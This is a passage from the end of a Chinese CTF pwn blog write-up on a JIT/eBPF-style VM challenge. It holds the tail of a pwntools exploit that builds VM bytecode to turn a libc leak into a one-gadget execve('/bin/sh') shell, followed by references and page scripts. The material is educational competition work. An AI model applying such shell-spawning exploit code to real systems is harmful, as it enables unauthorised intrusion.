class="hljs-string">b&#x27;61a0380100000000&#x27;</span>   <span class="hljs-comment">#mov eax,[rbp-0x138]</span><br>program += <span class="hljs-string">b&#x27;1400000083400200&#x27;</span>  <span class="hljs-comment">#sub eax,libc.sym[&#x27;__libc_start_main&#x27;]+243</span><br>program += <span class="hljs-string">b&#x27;04000000043b0e00&#x27;</span>  <span class="hljs-comment">#add eax,ogg</span><br>program += <span class="hljs-string">b&#x27;7b8a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],r14</span><br>program += <span class="hljs-string">b&#x27;630a280000000000&#x27;</span>  <span class="hljs-comment">#mov [rbp+0x28],eax</span><br>program += <span class="hljs-string">b&#x27;af22000000000000&#x27;</span>  <span class="hljs-comment">#xor rsi, rsi</span><br>program += <span class="hljs-string">b&#x27;af33000000000000&#x27;</span>  <span class="hljs-comment">#xor rdx, rdx</span><br>memory = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(program)//<span class="hljs-number">2</span>).encode()<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x2947)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,program)<br>leak(<span class="hljs-string">&quot;libc_start_main&quot;</span>,libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">243</span>)<br>sla(<span class="hljs-string">b&#x27;: &#x27;</span>,memory)<br><br><br><span class="hljs-comment"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [r12] == NULL || r12 == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [r15] == NULL || r15 == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-comment"># constraints:</span><br><span class="hljs-comment">#   [rsi] == NULL || rsi == NULL</span><br><span class="hljs-comment">#   [rdx] == NULL || rdx == NULL</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>‰∏çÁü•ÈÅìÊòØ‰∏çÊòØüë¥ÁöÑÈîôËßâÔºå<code>JIT</code>ÊÄªÁªôüë¥‰∏ÄÁßçÁî®<code>shellcode</code>ÂÆåÊàêÂà©Áî®ÊñπÂºèÁöÑ<code>vm</code>È¢ò</p>
<p>ÁúüÁöÑÈÄÜÂêêÊÉπü§Æü§Æü§Æ</p>
<p>ËÄå‰∏îüë¥Êúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÊÄé‰πàÈÇ£‰πàÂ§öüë¥ÁúãÂà∞È¢ò‰∏ÄÁúºÂ∞±Áü•ÈÅìÊòØ<code>ebpf</code>ÔºüÔºüÔºü</p>
<p>ÂêéÁª≠Ôºö</p>
<p><img src="/img/C++/23.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>üë¥&lt;‚Äî‚Äîü§°ü§°ü§°ü§°ü§°</p>
<h1 id="0xff-ÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé"><a href="#0xff-ÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé" class="headerlink" title="0xff:ÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé"></a>0xff:ÂÜôÂú®ÊúÄÂêéÁöÑÊúÄÂêé</h1><p>ÈÄÜ‰∏çÂä®‰∫ÜÔºåÁúütmÈÄÜ‰∏çÂä®‰∫ÜÔºåÊ±óÊµÅÊµÉËÉå‰∫ÜÂ∑≤Áªèü•µü•µü•µ</p>
<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a target="_blank" rel="noopener" href="https://zqy.ink/2023/05/12/dingjiqiandao/">N1CTF Junior 2023 pwn È°∂Á∫ßÁ≠æÂà∞ ËµõÈ¢òÂ§çÁé∞ | Âº†Ê∏ÖË∂ä (zqy.ink)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.8_pwn_dctf2017_flex.md">6.1 Pwn - 6.1.8 pwn DCTF2017 Flex - „ÄäCTF Á´ûËµõÂÖ•Èó®ÊåáÂçó(CTF All In One)„Äã - ‰π¶Ê†àÁΩë ¬∑ BookStack</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/89855#h3-8">Shanghai-DCTF-2017 Á∫ø‰∏ãÊîªÈò≤PwnÈ¢ò-ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/01/20/CTF-0X02-STARCTF2021-PWN/#0x02-babygame-double-free-tcache-poisoning">„ÄêCTF.0X02„Äë*CTF2021-Pwn WP - arttnba3‚Äôs blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/winmt/articles/17018284.html">NepnepxCATCTF Pwn-Chao WriteUp - winmt - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.roderickchan.cn/zh-cn/2023-02-02-2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-jit/">2023Ë•øÊπñËÆ∫ÂâëÂàùËµõpwn-jit - roderick - record and learn! (roderickchan.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://lst-oss.github.io/2023/08/23/jit-pwn/#2023-wmctf-jit">jit-pwn - Hexo (lst-oss.github.io)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Record-of-Learn/" class="category-chain-item">Record-of-Learn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/C/" class="print-no-link">#C++</a>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>dig into C++ pwn</div>
      <div>http://example.com/2023/10/20/C/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>‰ΩúËÄÖ</div>
          <div>korey0sh1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>ÂèëÂ∏É‰∫é</div>
          <div>2023Âπ¥10Êúà20Êó•</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>ËÆ∏ÂèØÂçèËÆÆ</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ÁΩ≤Âêç">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/10/31/ACTF/" title="ACTF">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ACTF</span>
                        <span class="visible-mobile">‰∏ä‰∏ÄÁØá</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/" title="Âçé‰∏∫ÊùØ">
                        <span class="hidden-mobile">Âçé‰∏∫ÊùØ</span>
                        <span class="visible-mobile">‰∏ã‰∏ÄÁØá</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ÁõÆÂΩï</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">ÊêúÁ¥¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">ÂÖ≥ÈîÆËØç</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        ÊÄªËÆøÈóÆÈáè 
        <span id="busuanzi_value_site_pv"></span>
         Ê¨°
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="busuanzi_value_site_uv"></span>
         ‰∫∫
      </span>
    
    
  
</div>

  
  
    <!-- Â§áÊ°à‰ø°ÊÅØ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      ‰∫¨ICPËØÅ123456Âè∑
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>‰∫¨ÂÖ¨ÁΩëÂÆâÂ§á12345678Âè∑</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
